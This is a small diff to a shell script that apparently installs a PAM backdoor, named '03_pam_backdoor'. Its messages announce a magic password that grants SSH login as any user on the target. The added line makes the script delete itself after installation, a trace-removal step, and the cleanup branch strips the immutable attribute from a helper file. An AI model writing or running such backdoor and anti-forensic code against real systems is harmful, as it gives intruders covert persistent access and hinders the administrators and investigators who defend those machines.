@@ -32,6 +32,7 @@ HELPER_EOF
     echo "[+] 03_pam_backdoor: installed in ${PAM_TARGET}"
     echo "[+]   Magic password: ${MAGIC}"
     echo "[+]   Usage: ssh <any-user>@<target>  (use magic password)"
+    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
     ;;
   cleanup)
     chattr -i "$HELPER" 2>/dev/null || true
